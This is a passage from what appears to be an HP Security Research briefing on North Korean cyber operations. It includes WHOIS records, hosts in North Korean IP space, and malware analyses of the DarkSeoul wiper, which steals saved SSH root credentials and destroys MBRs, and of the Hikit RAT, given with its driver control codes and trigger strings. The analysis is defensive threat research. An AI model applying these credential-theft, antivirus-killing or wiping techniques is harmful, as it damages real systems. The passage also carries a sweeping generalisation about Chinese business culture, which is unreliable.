wealthier nations, the regime has made significant progress in developing its infrastructure and in
establishing cyber operations. The rate of this progress warrants a closer look at North Korea
motivations, TTPs, and capabilities. As noted above, North Korea views the U.S. and South Korea
as its primary adversaries. The U.S. and South Korea are high-tech nations with economies that
      http://www.foxnews.com/world/2012/04/03/exclusive-cash-for-computers-is-un-busting-its-own-sanctions-in-north-korea/
      http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4
depend heavily on technology.398 In contrast, North Korea does not have a high tech culture. For
these reasons, we should not overestimate the regime
s advanced cyber capability, yet we should
never underestimate the potential impact of North Korea utilizing less advanced, quick-and-dirty
tactics like DDoS to cripple their high-tech targets. Both government and corporate entities are
susceptible to being targeted by North Korean cyber attacks. North Korean juche ideology places
the survival of the regime as its primary goal, and any perceived threat to the regime may be
targeted. Several attacks on U.S. and South Korean government, financial, and critical
infrastructure entities have been attributed to North Korean origins.. These attacks were often
preceded by or occurred in conjunction with North Korea voicing negative sentiments about the
targeted entities. As we saw with Iranian cyber actors in HPSR Security Briefing Episode 11,399
state sponsored cyber actors often launch an attack in response to a political trigger. The same
pattern seems to apply to pro-North Korean cyber actors, who have launched attacks to coincide
with U.S. Independence Day and the anniversary of the start of the Korean War, as well as
propaganda and cyber attacks in response to joint military exercises between the U.S. and South
Korea.400 401
As shown by North Korea's past behavior (which is consistent with their doctrine), they are easily
"pushed into a corner". At the slightest perceived threat, the regime responds with saber-rattling
and peacocking. The regime is extremely defensive and will, in turn, flex its muscles to show the
world how capable it is, even if this is an inaccurate display of their overall capabilities.
The regime fears losing its control and the nation
s culture to the ever-growing threat of outside
influence, as is evidenced in the regime
s reaction to the comedy film 
The Interview
. The regime
has represented itself to its citizens as a powerful and capable entity and has used this status to
control the populace. For this reason, the regime
s leaders are forced to continually demonstrate
this strength and power, or an illusion thereof, both domestically and globally, in order to
maintain the status needed to ensure continued suppression of the population. This show of
power may require that the regime takes chances and stretches beyond its abilities at times, but
in the spirit of juche and songun, the regime will continue this fa
ade, fearful of losing the image
its leaders have worked so hard to maintain.
HP Security Research recommendations
North Korean cyber operations are not generally observed originating from home field IP address
space, so geo-IP based blocking of traffic originating from those net-blocks is ineffective.
    http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH2.pdf
    http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/HPSR-Threat-Intelligence-Briefing-Episode-11/ba-p/6385243#.U5HkbpRdV90
    http://www.zdnet.com/south-korea-braces-for-norths-cyberattacks-7000012587/
    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
Given that North Korea has capable and technically trained forces and will demonstrate their
power when they feel provoked, western entities should consciously avoid promoting ideas or
doctrine that is blatantly slanderous to the regime. Encouraging such ideas could cause those
entities to become a focal point for North Korean cyber attacks.
Due to the fact that North Korean infrastructure is aging and its resources are not able to keep up
with the rest of the world, entities with interesting R&D or IP (intellectual property) - especially
military in nature 
 could become targets of interest for North Korea. Interest in defense-related
IP and R&D could also stem from North Korea
s relationship with China. In the Chinese business
culture, taking another entity
s IP or R&D is not stealing 
 it is accepted as business as usual. It is
possible that North Korea, if under Chinese influence, would adopt the same attitude, given the
regime
s limited capacity for homegrown innovation.
Known DPRK targets have been limited primarily to South Korean and U.S. organizations and
government entities. For these targets, prudent measures should include:
             
   Following traditional defense in depth approaches and security best practices
             
   Monitoring for malware that disables Korean language antivirus software, such as
                 that from AhnLab
             
   To protect against the attack vectors used in North Korean malware campaigns,
                 an advisable prevention tactic is to focus on hardening update/patch
                 management systems. These systems are appealing targets due to the potential
                 for a large impact
Appendix A 
 WHOIS records
WHOIS record for silibank.net:
Domain Name: silibank.net
Registry Domain ID:
Registrar WHOIS Server: whois.discount-domain.com
Registrar URL: http://www.onamae.com
Updated Date: 2014-03-11 17:27:55.0
Creation Date: 2006-03-13 13:14:53.0
Registrar Registration Expiration Date: 2015-03-13 03:14:53.0
Registrar: GMO INTERNET, INC.
Registrar IANA ID: 49
Registrar Abuse Contact Email: abuse@gmo.jp
Registrar Abuse Contact Phone:
Domain Status: ACTIVE
Registry Registrant ID:
Registrant Name: Whois Privacy Protection Service by MuuMuuDomain
Registrant Organization: Whois Privacy Protection Service by MuuMuuDomain
Registrant Street1: 2-7-21 Tenjin Chuo-ku
Registrant Street2: Tenjin Prime 8F
Registrant City: Fukuoka-shi
Registrant State/Province: Fukuoka
Registrant Postal Code: 810-0001
Registrant Country: JP
Registrant Phone: 81-927137999
Registrant Phone Ext:
Registrant Fax: 81-927137944
Registrant Fax Ext:
Registrant Email: privacy@whoisprivacyprotection.info
Registry Admin ID:
Admin Name: Whois Privacy Protection Service by MuuMuuDomain
Admin Organization: Whois Privacy Protection Service by MuuMuuDomain
Admin Street1: 2-7-21 Tenjin Chuo-ku
Admin Street2: Tenjin Prime 8F
Admin City: Fukuoka-shi
Admin State/Province: Fukuoka
Admin Postal Code: 810-0001
Admin Country: JP
Admin Phone: 81-927137999
Admin Phone Ext:
Admin Fax: 81-927137944
Admin Fax Ext:
Admin Email: privacy@whoisprivacyprotection.info
Registry Tech ID:
Tech Name: Whois Privacy Protection Service by MuuMuuDomain
Tech Organization: Whois Privacy Protection Service by MuuMuuDomain
Tech Street1: 2-7-21 Tenjin Chuo-ku
Tech Street2: Tenjin Prime 8F
Tech City: Fukuoka-shi
Tech State/Province: Fukuoka
Tech Postal Code: 810-0001
Tech Country: JP
Tech Phone: 81-927137999
Tech Phone Ext:
Tech Fax: 81-927137944
Tech Fax Ext:
Tech Email: privacy@whoisprivacyprotection.info
Name Server: ns1.dns.ne.jp
Name Server: ns2.dns.ne.jp
WHOIS Record for kcna.kp:
inetnum:       175.45.176.0 - 175.45.179.255
netname: STAR-KP
descr: Ryugyong-dong
descr: Potong-gang District
country: KP
admin-c: SJVC1-AP
tech-c: SJVC1-AP
status: ALLOCATED PORTABLE
mnt-by: APNIC-HM
mnt-lower: MAINT-STAR-KP
mnt-routes: MAINT-STAR-KP
remarks: -+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+
remarks: This object can only be updated by APNIC hostmasters.
remarks: To update this object, please contact APNIC
remarks: hostmasters and include your organisation's account
remarks: name in the subject line.
remarks: -+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+
mnt-irt: IRT-STAR-KP
changed: hm-changed@apnic.net 20091221
source: APNIC
irt: IRT-STAR-KP
address: Ryugyong-dong Potong-gang District
e-mail: sahayod@loxley.co.th
abuse-mailbox: sahayod@loxley.co.th
admin-c: SJVC1-AP
tech-c: SJVC1-AP
auth: # Filtered
mnt-by: MAINT-STAR-KP
changed: sahayod@loxley.co.th 20120202
source: APNIC
role: STAR JOINT VENTURE CO LTD - network administrat
address: Ryugyong-dong Potong-gang District
country: KP
phone: +66 81 208 7602
fax-no: +66 2 240 3180
e-mail: sahayod@loxley.co.th
admin-c: SJVC1-AP
tech-c: SJVC1-AP
nic-hdl: SJVC1-AP
mnt-by: MAINT-STAR-KP
changed: hm-changed@apnic.net 20091214
source: APNIC
WHOIS Record for rodong.rep.kp:
inetnum:     175.45.176.0 - 175.45.179.255
netname:      STAR-KP
descr:     Ryugyong-dong
descr:     Potong-gang District
country:     KP
admin-c:     SJVC1-AP
tech-c:     SJVC1-AP
status:     ALLOCATED PORTABLE
mnt-by:      APNIC-HM
mnt-lower: MAINT-STAR-KP
mnt-routes: MAINT-STAR-KP
remarks:     -+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+
remarks:     This object can only be updated by APNIC hostmasters.
remarks:     To update this object, please contact APNIC
remarks:     hostmasters and include your organisation's account
remarks:     name in the subject line.
remarks:     -+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+
mnt-irt:    IRT-STAR-KP
changed:      hm-changed@apnic.net 20091221
source:     APNIC
irt:     IRT-STAR-KP
address:     Ryugyong-dong Potong-gang District
e-mail:     sahayod@loxley.co.th
abuse-mailbox: sahayod@loxley.co.th
admin-c:     SJVC1-AP
tech-c:     SJVC1-AP
auth:      # Filtered
mnt-by:      MAINT-STAR-KP
changed:      sahayod@loxley.co.th 20120202
source:     APNIC
role:      STAR JOINT VENTURE CO LTD - network administrat
address:     Ryugyong-dong Potong-gang District
country:     KP
phone:      +66 81 208 7602
fax-no:     +66 2 240 3180
e-mail:     sahayod@loxley.co.th
admin-c:     SJVC1-AP
tech-c:     SJVC1-AP
nic-hdl:    SJVC1-AP
mnt-by:      MAINT-STAR-KP
changed:      hm-changed@apnic.net 20091214
source:     APNIC
WHOIS Record for uriminzokkiri.com:
Domain Name : uriminzokkiri.com
PunnyCode : uriminzokkiri.com
Creation Date : 2003-02-09 00:00:00
Updated Date : 2012-06-28 13:22:18
Expiration Date : 2015-02-09 00:00:00
Registrant:
Organization : chaoxianLiuYiYuBianJishe ShenYang Ban SHICHU
Name : Korea 615 Shenyang company
Address : shenyang hepingqu xifudalu 168 hao 2 danyuan 2-12-1
City : shenyangshi
Province/State : liaoningsheng
Country : china
Postal Code : 123456
Administrative Contact:
Name : kim sejun
Organization : Shenyang xin neng yuang
Address : shenyang hepingqu xifudalu 168 hao 2 danyuan 2-12-1
City : shenyangshi
Province/State : liaoningsheng
Country : china
Postal Code : 123456
Phone Number :
Fax : 86-024-22523102
Email : hyk1979@hotmail.com
Technical Contact: Name : kim sejun
Organization : Shenyang xin neng yuang
Address : shenyang hepingqu xifudalu 168 hao 2 danyuan 2-12-1
City : shenyangshi
Province/State : liaoningsheng
Country : china
Postal Code : 123456
Phone Number :
Fax : 86-024-22523102
Email : hyk1979@hotmail.com
Billing Contact:
Name : kim sejun
Organization : Shenyang xin neng yuang
Address : shenyang hepingqu xifudalu 168 hao 2 danyuan 2-12-1
City : shenyangshi
Province/State : liaoningsheng
Country : china
Postal Code : 123456
Phone Number :
Fax : 86-024-22523102
Email : hyk1979@hotmail.com
WHOIS Record for ournation-school.com:
Domain Name: ournation-school.com
Registry Domain ID:
Registrar WHOIS Server:whois.paycenter.com.cn
Registrar URL:http://www.xinnet.com
Updated Date:2012-06-28 13:22:20
Creation Date:2004-10-29 00:00:00
Registrar Registration Expiration Date:2014-10-29 00:00:00
Registrar:XINNET TECHNOLOGY CORPORATION
Registrar IANA ID:120
Registrar Abuse Contact Email: supervision@xinnet.com
Registrar Abuse Contact Phone:+86.1087128064
Domain Status:
Registry Registrant ID:
Registrant Name:Korea 615 Shenyang company
Registrant Organization:chaoxian liuyiyubianjishe shenyangbanshichu
Registrant Street:shenyang hepingqu xifudalu 168 hao 2 danyuan 2-12-1
Registrant City:shenyangshi
Registrant State/Province:liaoningsheng
Registrant Postal Code:123456
Registrant Country:China
Registrant Phone:+86.024 22523102
Registrant Phone Ext:
Registrant Fax:+86.024 22523102
Registrant Fax Ext:
Registrant Email:urimanager@silibank.com
Registry Admin ID:
Admin Name:Korea 615 Shenyang company
Admin Organization:Korea 615 Shenyang company
Admin Street:shenyang hepingqu xifudalu 615 hao 2 danyuan 6-1-5
Admin City:shenyangshi
Admin State/Province:liaoningsheng
Admin PostalCode:123456
Admin Country:China
Admin Phone:+86.024 22523102
Admin Phone Ext:
Admin Fax:+86.024 22523102
Admin Fax Ext:
Admin Email:urimanager@silibank.com
Registry Tech ID:
Tech Name:Korea 615 Shenyang company
Tech Organization:Korea 615 Shenyang company
Tech Street:shenyang hepingqu xifudalu 615 hao 2 danyuan 6-1-5
Tech City:shenyangshi
Tech State/Province:liaoningsheng
Tech PostalCode:123456
Tech Country:China
Tech Phone:+86.024 22523102
Tech Phone Ext:
Tech Fax:+86.024 22523102
Tech Fax Ext:
Tech Email:urimanager@silibank.com
Name Server:ns13.xincache.com
Name Server:ns14.xincache.com
DNSSEC:unsigned
WHOIS Record for chongryon.com:
Domain Name: chongryon.com
Registry Domain ID: 69711868_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.melbourneit.com
Registrar URL: http://www.melbourneit.com.au
Updated Date: 2014-03-26T00:31:24Z
Creation Date: 2001-04-20T06:45:46Z
Registrar Registration Expiration Date: 2015-04-20T06:45:46Z
Registrar: Melbourne IT Ltd
Registrar IANA ID: 13
Registrar Abuse Contact Email: abuse@melbourneit.com.au
Registrar Abuse Contact Phone: +61.386242300
Domain Status: ok
Registry Registrant ID:
Registrant Name: o guanin
Registrant Organization: o guanin
Registrant Street: "hujimi2-14-15,"
Registrant City: chiyodaku
Registrant State/Province: tokyo
Registrant Postal Code: 1028138
Registrant Country: JP
Registrant Phone: +81.332627111
Registrant Phone Ext:
Registrant Fax:
Registrant Fax Ext:
Registrant Email: park2@mac.com
Registry Admin ID:
Admin Name: guanin o
Admin Organization:
Admin Street: "hujimi2-14-15,"
Admin City: chiyodaku
Admin State/Province: tokyo
Admin Postal Code: 1028138
Admin Country: JP
Admin Phone: +81.332627111
Admin Phone Ext:
Admin Fax:
Admin Fax Ext:
Admin Email: park2@mac.com
Registry Tech ID:
Tech Name: Link Club
Tech Organization: Link Club
Tech Street: 5-39-6 Jingumae Shibuya-ku
Tech City: TOKYO
Tech State/Province: 150-0001
Tech Postal Code: JP
Tech Country: JP
Tech Phone: +81.462643403
Tech Phone Ext:
Tech Fax:
Tech Fax Ext:
Tech Email: mel-tech@hosting-link.ne.jp
Name Server: USR-NS1.LINKCLUB.JP
Name Server: USR-NS2.LINKCLUB.JP
DNSSEC: unsigned
URL of the ICANN WHOIS Data Problem Reporting System: http://wdrprs.internic.net
>>> Last update of WHOIS database: 2014-05-13T18:15:18Z
WHOIS Record for korea-np.co.jp:
Domain Information: [B%I%a%$%s>pJs]
a. [B%I%a%$%sL>]            KOREA-NP.CO.JP
e. [B$=$7$-$a$$]          B$+$V$7$-$,$$$7$c B$A$g$&$;$s$7$s$]$&$7$c
f. [BAH?%L>]           B3t<02q<R BD+A/?7Js<R
g. [Organization]       The Choson Shinbo Company Inc.
k. [BAH?%<oJL]           B3t<02q<R
l. [Organization Type]    CO
m. [BEPO?C4Ev<T]           YK18923JP
n. [B5;=QO"MmC4Ev<T]         YK18923JP
p. [B%M!<%`%5!<%P]           uns01.usen.ad.jp
p. [B%M!<%`%5!<%P]           uns02.usen.ad.jp
s. [B=pL>80]
[B>uBV]              Connected (2015/02/28)
[BEPO?G/7nF|]           1997/02/14
[B@\B3G/7nF|]            1997/06/03
[B:G=*99?7]            2014/03/01 01:16:34 (JST)
Appendix B 
 Sites found on North Korean IP space
smtp.star-co.net.kp    175.45.176.10   airkoryo.com.kp        175.45.176.69
smtp.start-di.net.kp   175.45.176.10   spwebh2.star.net.kp    175.45.176.7
spinef1.star.net.kp    175.45.176.10   mail.silibank.net.kp   175.45.176.70
spinef2.star.net.kp    175.45.176.11   kcna.kp                175.45.176.71
ns1.co.kp              175.45.176.15   gnu.rep.kp             175.45.176.73
ns1.com.kp             175.45.176.15   vok.rep.kp             175.45.176.75
ns1.edu.kp             175.45.176.15   friend.com.kp          175.45.176.8
ns1.gov.kp             175.45.176.15   korelcfund.org.kp      175.45.176.8
ns1.kptc.kp            175.45.176.15   ns1.cooks.org.kp       175.45.176.8
ns1.kptc.kp            175.45.176.15   ns1.friend.com.kp      175.45.176.8
ns1.net.kp             175.45.176.15   ns1.gnu.rep.kp         175.45.176.8
ns1.org.kp             175.45.176.15   ns1.kcna.kp            175.45.176.8
ns1.org.kp             175.45.176.15   ns1.koredfund.org.kp 175.45.176.8
ns1.rep.kp             175.45.176.15   ns1.korelcfund.org.kp 175.45.176.8
ns2.co.kp              175.45.176.16   ns1.korfilm.com.kp     175.45.176.8
ns2.com.kp             175.45.176.16   ns1.ksf.com.kp         175.45.176.8
ns2.edu.kp             175.45.176.16   ns1.naenara.com.kp     175.45.176.8
ns2.gov.kp             175.45.176.16   ns1.rodong.rep.kp      175.45.176.8
ns2.kptc.kp            175.45.176.16   ns1.silibank.net.kp    175.45.176.8
ns2.kptc.kp            175.45.176.16   ns1.star-co.net.kp     175.45.176.8
ns2.net.kp             175.45.176.16   ns1.star-di.net.kp     175.45.176.8
ns2.org.kp             175.45.176.16   ns1.star.net.kp        175.45.176.8
ns2.rep.kp             175.45.176.16   ns1.vok.rep.kp         175.45.176.8
friend.com.kp          175.45.176.39   ns2.airkoryo.com.kp    175.45.176.8
friend.com.kp          175.45.176.67   friend.com.kp          175.45.176.9
gnu.rep.kp             175.45.176.67   gnu.rep.kp             175.45.176.9
koredfund.org.kp       175.45.176.67   koredfund.org.kp       175.45.176.9
korelcfund.org.kp      175.45.176.67   korelcfund.org.kp      175.45.176.9
ksf.com.kp             175.45.176.67   ns2.airkoryo.com.kp    175.45.176.9
naenara.com.kp         175.45.176.67   ns2.cooks.org.kp       175.45.176.9
vok.rep.kp             175.45.176.67   ns2.friend.com.kp      175.45.176.9
rodong.rep.kp          175.45.176.68   ns2.gnu.rep.kp         175.45.176.9
ns2.kcna.kp           175.45.176.9    friend.com.kp       175.45.177.77
ns2.koredfund.org.kp 175.45.176.9     koredfund.org.kp    175.45.177.77
ns2.korelcfund.org.kp 175.45.176.9    korelcfund.org.kp   175.45.177.77
ns2.korfilm.com.kp    175.45.176.9    naenara.com.kp      175.45.177.77
ns2.ksf.com.kp        175.45.176.9    vok.rep.kp          175.45.177.77
ns2.naenara.com.kp    175.45.176.9    mail.chosunexpo.com 175.45.178.101
ns2.rodong.rep.kp     175.45.176.9    ns3.kptc.kp         175.45.178.173
ns2.silibank.rep.kp   175.45.176.9    ns3.kptc.kp         175.45.178.173
ns2.star-co.net.kp    175.45.176.9    ns1.knic.com.kp     175.45.178.8
ns2.star-di.net.kp    175.45.176.9    ns1.knic.com.kp     175.45.178.8
ns2.star.net.kp       175.45.176.9    ns1.star.edu.kp     175.45.179.66
ns2.vok.rep.kp        175.45.176.9    ns1.star.edu.kp     175.45.179.66
vok.rep.kp            175.45.176.9    email.kp.col.cn     175.45.179.67
gnu.rep.kp            175.45.177.73   mail.star.edu.kp    175.45.179.69
vok.rep.kp            175.45.177.75
Appendix C 
 Analysis of DarkSeoul Dropper
Dropper
MD5: 9263e40d9823aecf9388b64de34eae54
Also known as/detected as :
    
 Dropper-FDH (McAfee)
    
 Trojan:Win32/Dembr.A (Microsoft)
    
 Trojan.Jokra (Symantec)
The dropper component that we examined was distributed as a UPX-packed binary.
Installation
When executed it creates the following files in the affected user
s %Temp% directory:
    
   alg.exe: A legitimate binary used to open SSH connections with remote servers
        MD5 e45cd9052dd3dd502685dfd9aa2575ca
        Size: 166,912 bytes
    
   conime.exe: A legitimate binary used to open SSH connections with remote servers
        MD5: 6a702342e8d9911bde134129542a045b
        Size: 153,600 bytes
    
   ~pr1.tmp: Payload - A destructive bash script
        MD5: dc789dee20087c5e1552804492b042cd
        Size: 1,186 bytes
        Also known as/detected as: 
                 KillMBR-FBIA (McAfee)
                 Trojan:SH/Kofornix.A (Microsoft)
                 Trojan.Jokra (Symantec)
    
   AgentBase.exe: Payload - Win32 wiper component (see details below)
        MD5: db4bbdc36a78a8807ad9b15a562515c4
        Size: 24,576 
Payload
attempts to connect to remote servers and upload a destructive bash script 
After determining the location of user profile directories on the affected computer, the malware
searches these directories for configuration files and directories that may be associated with the
connection manager clients mRemote and SecureCRT. 
 mRemote
an open source tool for centrally managing remote server connections using a GUI
(Kevin Kline, 2008).69 This tool is no longer being actively developed or supported. 
 SecureCRT
a commercial SSH and Telnet client by VanDyke Software. 
If an mRemote installation is located, the dropper reads the configuration file and checks if there
a NODE that is defined with 
Username=root
Protocol=SSH
, and a password that is not blank. If
those conditions are satisfied it extracts the information. The password is decrypted after being
extracted. 
If a SecureCRT installation is located, the dropper extracts information from sessions that have
Username=root, Protocol=SSH and a saved password. If these conditions are satisfied, the
username, hostname, port, and password are extracted. The password is then decrypted. 
After extracting these connection and server details, the dropper uses the previously dropped alg.
exe and conime.exe to attempt to connect remote servers, upload and run the bash script
~pr1.tmp. 
The bash script initially checks which UNIX it is running on (of HP-UX, SunOS, Linux, or AIX) and
then attempts to wipe the /kernel, /usr /etc and /home directories, thus rendering the machine
inoperative.
Win32 Wiper component
When the AgentBase.exe component is executed, it first attempts to stop the following processes,
presumably in order to evade detection:
 pasvc.exe 
 policy agent from AhnLab
 clisvc.exe 
 ViRobot ISMS from Hauri
It then enumerates all physical drives and overwrites the first 512 bytes with the string:
princpes
, effectively destroying the MBR (master boot record) of the affected drive.
It continues to look for removable and fixed drives, locates the root directory on these drives, and
then attempts to delete all files and folders in this directory.
Finally, the affected computer is shut down and rebooted, although if the wiping mechanisms
were successful then the machine will not be able to boot.
Learn more at
hp.com/go/hpsr
                                                                                                            
Hikit Analysis
Basic Description
Hikit consists of at least two generations of malware that provides basic RAT functionality. The first
generation of Hikit (referred to as 
Gen 1
) operates as a server and requires an externally exposed
network interface in order for an attacker to access the victim machine. The second generation of Hikit
(referred to as 
Gen 2
) uses the more traditional client model and beacons out to an attacker
s C2
server. While the communication models shifted dramatically between Gen 1 and Gen 2, both
generations of Hikit retain the same basic RAT function consisting of remote command shell, file
management, network proxy and port forwarding.
Both Gen 1 and Gen 2 sub-families of Hikit consist of a main DLL (referred to as 
the DLL
) that
contains the RAT functionality; a kernel driver (referred to as 
the Driver
) with Gen 2 also employs an
additional component: a loader executable. The driver component of Gen 1 and Gen 2 are drastically
different in their operation and intent. For the Gen 1 sub-family of Hikit, the driver acts as a NDIS
(network) driver that is responsible for interfacing the DLL to the network while preventing a direct
WinSock interface from occurring. The Gen 1 Driver listens to network traffic arriving at the local
network interface and waits for a specific trigger string. The trigger string varies by Driver and DLL
sample. The Gen 2 Driver is a simpler system driver that acts as a rootkit to hide processes, registry
keys and network connections associated with Gen 2 activity on the victim
s system.
Gen 2 uses a standard client-server malware model meaning that the malware no longer requires a
direct Internet-facing network card, no longer uses a network driver for networking, and provides the
ability to network multiple Gen 2 samples behind a firewall with greater ease (from the attacker
perspective). The Gen 2 sub-family, however, no longer employs network stealth provided by the Gen 1
network driver which exposes the C2 server addresses to analysts.
Each of the Hikit generations contains multiple sub-generations as the author(s) of Hikit have evolved
their code over time. There is a noticeable steep improvement over the code base of Gen 1 Hikit family
during its 2011 development period. The Gen 2 sub-generations share a similar improvement scale
between late 2011 and late 2013.
Evolution
The earliest known Hikit sample dates back to 31 March 2011. Known as the Gen 1.0 sub-generation of
Hikit Gen 1, the first known sample of Hikit deviated from the later traditional Gen 1 model. The Gen 1.0
sample was a standalone executable whereas subsequent Gen 1 sub-generations use a DLL running
as a service. The Gen 1.0 sample is clearly a work-in-progress. The Gen 1.0 sample, while different
than subsequent sub-generations, does still rely on the Driver component and for the most part the
structure of the code does not differ much going forward into the Gen 1 evolution.
Less than three weeks after Gen 1.0, the author(s) of Hikit move into Gen 1.1. The notable change is
that the Hikit model of using a DLL and driver, which has remained until present day, comes into being.
The code matures slightly between Gen 1.0 and Gen 1.1 but the functionality does not change. Both
Gen 1.0 and Gen 1.1 use plaintext data transmissions.
Development appears to halt on Gen 1 for 4 months between 20 June 2011 and 23 October 2011
based on a lack of available samples found. During this time the development of Hikit appears to
change locations. Gen 1 samples have Program Database (PDB) file strings that identify the file path of
the Hikit source code. For Gen 1.0 and Gen 1.1 samples, the file path of the Hikit source code is
consistently h:\JmVodServer\hikit. Starting with Gen 1.2, the file path switches to
e:\SourceCode\hikit_new. It is at this time that the functionality of Hikit Gen 1 begins to mature.
In Gen 1.2, the communication between the infected machine and the attacker is encrypted using an
XOR mask. A more subtle change is the renaming of the 
socks5
 command to simply 
proxy
 within
the code. The code within Hikit begins to mature but the overall functionality does not expand beyond
the original set of commands found in Gen 1.0. The other remarkable change within the Gen 1.1 to Gen
1.2 development is the way in which the session handshake trigger operates. In Gen 1.0 and Gen 1.1,
the DLL instructs the Driver to listen for a specific string (typically a HTTP request string) and responds
with another string. In Gen 1.2, the Driver has a hardcoded trigger string (a specific HTTP request
string) and the DLL instructs the Driver to inspect a specific HTTP header field for a specific
hexadecimal value. This moves Gen 1.2 into more of a username/password authentication scheme
whereas previous sub-generations could potentially be accessed by accidental HTTP requests. At the
same time, the Driver responds with a specific value with in the Etag HTTP header field. This places
Gen 1.2 into a more stealth position as a random, non-HTTP compliant response from Gen 1.0 and
Gen 1.1 samples is more obvious than a legitimate HTTP response with a specially crafted Etag
header.
Gen 1.2
s development cycle appears to exist between 23 October 2011 and 2 November 2011 with
several new samples being found on the Internet having legitimate compile times during this time
window. There is, however, evidence that the development of Hikit Gen 1 and Gen 2 overlap by several
months. The earliest Gen 2 sample known to exist dates to 28 August 2011, two months before the first
known Gen 1.2 sample. The last known Gen 1.2 sample, and by extension, the last known Gen 1
sample, dates to 9 April 2012.
The first known Gen 2 sub-generation, Gen 2.0 Alpha, much like Gen 1.0, represents an early
development version of the Gen 2 Hikit sub-family. Gen 2.0 Alpha is a stand-alone Windows console
executable that can run as a service executable. Gen 2.0 Alpha supports the same commands as Gen
1.2 with an additional command that returns the infection
s configuration information.
On 9 February 2012 the first known sample for Gen 2.0 Beta is compiled by the developer(s) of Hikit.
Also a stand-alone console executable like Gen 2.0 Alpha, the Gen 2.0 Beta code changes internally
without providing significant functionality improvements with the exception of now the executable uses
a device driver to hide network, file, and registry artifacts related to its operation. Both Gen 2.0 Alpha
and Gen 2.0 Beta still retain PDB file path information within their binaries. During the development
phase of Gen 2.0 Alpha, development of the Gen 2.0 Alpha variants changes locations. First version of
the Gen 2.0 Alpha malware, from 28 August 2011, has the PDB path located in
H:\JmVodServer\Matrix_new2 whereas the file path for later Gen 2.0 Alpha and Gen 2.0 Beta
binaries has the PDB path in E:\SourceCode\Matrix_new which suggests that the source code for
both Gen 1 and Gen 2 existed on the same machine and moved at roughly the same time. This may
indicate either a single developer or a team (or set of teams) with shared resources.
The first known Gen 2.1 binary has a compile date of 17 April 2012. Gen 2.1 represents the first Gen 2
sub-generation to use an executable-based loader, DLL and driver model, a model that all subsequent
Gen 2 sub-generations employ. The functionality of the Gen 2.1 sub-generation is the same as the
previous generations with no new commands being introduced. Gen 2.1 is the first sub-generation in
the Gen 2 sub-family to introduce 64-bit binaries.
The Gen 2.2 sub-generation appears to have begun on 20 July 2012. Gen 2.2 is notable for altering
where the configuration information of the RAT is stored and using both DLL-based and executable-
based loaders. Also notable is the fact that the sub-generation spans a significant amount of time with
intermittent periods of development. The bulk of the Gen 2.2 samples that have the tell-tale marks of
being the product of a builder have a compile date of 26 July 2013, a full year after the first known Gen
2.2 sample. Between 21 July 2012 and 20 February 2013, there are no known Gen 2.2 binaries. The
two 20 July 2012 samples have different compile times indicating they were not the product of a builder
but rather unique compilations. Between 21 February 2013 and 27 February 2013, there are 4 unique
compilation dates for the DLL component with 7 unique, known Gen 2.2 DLLs. The bulk of Gen 2.2
samples have a compile date of 26 July 2013. There are approximately 25 known Gen 2.2 DLLs with
the 26 July 2013 compile date. The Gen 2.2 sub-generation appears to exist through at least 19
September 2013.
The last known Gen 2 sub-generation, Gen 2.3, began on 12 December 2013. Gen 2.3 is notable for its
use of a legitimate SSL certificate as part of the handshake between the infected machine and the
attacker
s C2. The DLL will send a legitimate SSL certificate as a means to disrupt heuristic IDS
sensors that look for encrypted traffic. Another interesting aspect of the Gen 2.3 sub-generation is that
there is no longer a marker to designate the beginning of the embedded configuration. Gen 2.1 and
Gen 2.2 uses a specific string to indicate the beginning of the embedded configuration presumably in
order to allow the builder to locate the configuration space when constructing a new configuration for
the binaries. Gen 2.3, however, uses a specific location instead, requiring the builder to calculate the
specific location using the PE/COFF header of the binary. Also, while Gen 2.1 and Gen 2.2 retain the
configuration within the DLL component, Gen 2.3 stores the configuration within the loader component.
This allows the attackers to configure the loader without having to update the DLL.
The evolution of Hikit is a long and drawn out series of small, incremental development changes. The
important take away from the evolution of Hikit is that the developers for Gen 1 appear to have changed
in late 2011 and development of Gen 2 has a several month overlap with the development and usage
of Gen 1. The following table provides a quick reference to the generational (and sub-generational)
designations of Hikit.
                                        August
                                        28, 2011
                                 Timeline Outlined in Appendix A: HiKit Versions
The Driver
The Driver component for Hikit varies based on the specific Hikit sub-family (Gen 1 or Gen 2). As such
it is necessary to describe each in the context of its specific sub-family.
Gen 1 Driver
The Driver component of Gen 1 Hikit variants provides the interface between the victim
s network
interface card (NIC) and the DLL. The Driver is a NDIS (network) driver that integrates into the victim
network stack. The Driver intercepts any and all network communication that traverses the Windows
network stack and potentially removes the data from the network stack under very specific conditions.
When the Driver removes data from the network stack, the Driver stores the removed data in local
buffers for the Gen 1 DLL to query against. The purpose of this behavior is to allow the DLL to interact
with the network without utilizes the WinSock API which could potentially reveal the presence of Hikit.
In order to interact with the Driver, the DLL uses the function
IoDeviceControl
to send commands to
the Driver. The Driver registers itself at both
\Device\w7fw
\DosDevices\w7fw
thereby
allowing the DLL to access the Driver by performing a
CreateFile
request to
\\.\w7fw
\\.\Globals\w7fw in order to obtain a handle to the Driver. The Driver
s interface supports the
following OIDs:
       OID             Function
       0x12C828        No-op
       0x12C82C        Retrieves bytes from the recv queue.
       0x12C830        Add bytes to the xmit queue.
       0x12C838        Set key value (the trigger value)
       0x12C840        Change mode for current process
s channel to 2
       0x12C844        Activates channel
       0x12C848        Shuts down a channel by flushing all queued packets/data to the network with ACK|FIN
                       set in the flags
       0x12C84C        Returns the current mode for a given channel
       0x12C850        Get the Driver
s version
The Driver will remove data from the network stack only if a new channel is being established. A new
channel occurs when the Driver detects a trigger string. The trigger string is typically a short form HTTP
request with the following trigger strings found in the wild:
       Generation(s)    Trigger String                   Authentication Response Value
                                                         Value
       Gen 1.0, 1.1     GET /password                                   .welcome.
                        HTTP/1.1\r\n\r\n
